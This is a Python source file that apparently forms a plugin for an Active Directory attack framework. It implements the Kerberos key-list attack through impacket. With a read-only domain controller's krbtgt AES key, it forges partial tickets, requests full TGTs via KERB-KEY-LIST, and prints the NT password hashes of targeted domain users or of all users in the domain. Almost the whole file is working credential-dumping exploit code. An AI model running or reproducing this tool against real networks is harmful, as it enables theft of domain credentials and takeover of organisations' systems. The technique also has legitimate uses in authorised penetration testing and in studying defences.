import argparse
import os
import random
from copy import copy

from impacket.examples.secretsdump import RemoteOperations, KeyListSecrets
from impacket.krb5 import constants
from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection

from plugins.AD import PluginAdExploitBase, parse_user_args
from utils import output
from utils.consts import AllPluginTypes

try:
    rand = random.SystemRandom()
except NotImplementedError:
    rand = random
    pass


class PluginADImpacketKlistAttack(PluginAdExploitBase):
    display = "klist attack"
    alias = "imp_klst"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("-u", "--username", help="username", required=True, dest="username")
        parser.add_argument("-p", "--password", help="password", required=False, dest="password")

        parser.add_argument('--rodcNo', action='store', type=int, help='Number of the RODC krbtgt account')
        parser.add_argument('--rodcKey', action='store', help='AES key of the Read Only Domain Controller')
        parser.add_argument('--full', action='store_true', default=False,
                            help='Run the attack against all domain users. '
                                 'Noisy! It could lead to more TGS requests being rejected')

        group = parser.add_argument_group('LIST option')
        group.add_argument('--kdc', action='store', help='KDC HostName or FQDN (only works with LIST)')
        group.add_argument('-t', action='store', help='Attack only the username specified (only works with LIST)')
        group.add_argument('--tf', action='store',
                           help='File that contains a list of target usernames (only works with LIST)')

        group = parser.add_argument_group('authentication')
        group.add_argument('--hashes', action="store", metavar="LMHASH:NTHASH",
                           help='Use NTLM hashes to authenticate to SMB '
                                'and list domain users.')
        group.add_argument('--no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
        group.add_argument('-k', action="store_true",
                           help='Use Kerberos to authenticate to SMB and list domain users. Grabs '
                                'credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot '
                                'be found, it will use the ones specified in the command line')
        group.add_argument('--aesKey', action="store", metavar="hex key",
                           help='AES key to use for Kerberos Authentication'
                                ' (128 or 256 bits)')
        group = parser.add_argument_group('connection')
        group.add_argument('--dc-ip', action='store', metavar="ip address",
                           help='IP Address of the domain controller. If '
                                'ommited it use the domain part (FQDN) specified in the target parameter')
        group.add_argument('--target-ip', action='store', metavar="ip address",
                           help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                                'This is useful when target is the NetBIOS name and you cannot resolve it')

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        if args.rodcNo is None:
            output.error("You must specify the RODC number (krbtgt_XXXXX)")
            return result
        if args.rodcKey is None:
            output.error("You must specify the RODC aes key")
            return result

        domain, username, password, remoteName = parse_user_args(args)

        if remoteName == '':
            output.error("You must specify a target or set the option LIST")
            return result

        if remoteName == 'LIST':
            targets = []
            if args.full is True:
                output.warning("Flag -full will have no effect")
            if args.t is not None:
                targets.append(args.t)
            elif args.tf is not None:
                try:
                    with open(args.tf, 'r') as f:
                        for line in f:
                            target = line.strip()
                            if target != '' and target[0] != '#':
                                targets.append(target + ":" + "N/A")
                except IOError as error:
                    output.error("Could not open file: %s - %s", args.tf, str(error))
                    return result
                if len(targets) == 0:
                    output.error("No valid targets specified!")
                    return result
            else:
                output.error("You must specify a target username or targets file")
                return result

            if args.kdc is not None:
                if '.' in args.kdc:
                    remoteName, domain = args.kdc.split('.', 1)
                else:
                    remoteName = args.kdc
            else:
                output.error("You must specify the KDC HostName or FQDN")
                return result

            if args.target_ip is None:
                args.target_ip = remoteName
            if domain == '':
                output.error("You must specify a target domain. Use the flag -domain or define a FQDN in flag -kdc")
                return result

            keylistdumper = KeyListDump(remoteName, username, password, domain, args, False, targets)
        else:
            if '@' not in args.target:
                output.error("You must specify the KDC HostName or IP Address")
                return result
            if args.target_ip is None:
                args.target_ip = remoteName
            if domain == '':
                output.error("You must specify a target domain")
                return result
            if username == '':
                output.error("You must specify a username")
                return result
            if password == '' and args.hashes is None and args.no_pass is False and args.aesKey is None:
                from getpass import getpass
                password = getpass("Password:")

            keylistdumper = KeyListDump(remoteName, username, password, domain, args, True, targets=[])

        try:
            keylistdumper.run()
        except Exception as e:
            output.error(e)

        return result


class KeyListDump:
    def __init__(self, remoteName, username, password, domain, options, enum, targets):
        self.__domain = domain
        self.__username = username
        self.__password = password
        self.__aesKey = options.aesKey
        self.__doKerberos = options.k
        self.__aesKeyRodc = options.rodcKey
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__kdcHost = options.dc_ip
        self.__rodc = options.rodcNo
        # self.__kvno = 1
        self.__enum = enum
        self.__targets = targets
        self.__full = options.full
        self.__smbConnection = None
        self.__remoteOps = None
        self.__keyListSecrets = None

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')
        else:
            self.__lmhash = ''
            self.__nthash = ''

    def connect(self):
        try:
            self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
            if self.__doKerberos:
                self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                   self.__nthash, self.__aesKey, self.__kdcHost)
            else:
                self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash,
                                           self.__nthash)
        except Exception as e:
            if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                # SMBConnection failed. That might be because there was no way to log into the
                # target system. We just have a last resort. Hope we have tickets cached and that they
                # will work
                output.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                pass
            else:
                raise

    def run(self):
        if self.__enum is True:
            self.connect()
            self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
            self.__remoteOps.connectSamr(self.__domain)
            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, self.__remoteOps)
            output.info('Enumerating target users. This may take a while on large domains')
            if self.__full is True:
                targetList = self.getAllDomainUsers()
            else:
                targetList = self.__keyListSecrets.getAllowedUsersToReplicate()
        else:
            output.info('Using target users provided by parameter')
            self.__keyListSecrets = KeyListSecrets(self.__domain, self.__remoteName, self.__rodc, self.__aesKeyRodc, None)
            targetList = self.__targets

        output.info('Dumping Domain Credentials (domain\\uid:[rid]:nthash)')
        output.info('Using the KERB-KEY-LIST request method. Tickets everywhere!')
        for targetUser in targetList:
            user = targetUser.split(":")[0]
            targetUserName = Principal('%s' % user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            partialTGT, sessionKey = self.__keyListSecrets.createPartialTGT(targetUserName)
            fullTGT = self.__keyListSecrets.getFullTGT(targetUserName, partialTGT, sessionKey)
            if fullTGT is not None:
                key = self.__keyListSecrets.getKey(fullTGT, sessionKey)
                print(self.__domain + "\\" + targetUser + ":" + key[2:])

    def getAllDomainUsers(self):
        resp = self.__remoteOps.getDomainUsers()
        # Users not allowed to replicate passwords by default
        deniedUsers = [500, 501, 502, 503]
        targetList = []
        for user in resp['Buffer']['Buffer']:
            if user['RelativeId'] not in deniedUsers and "krbtgt_" not in user['Name']:
                targetList.append(user['Name'] + ":" + str(user['RelativeId']))

        return targetList
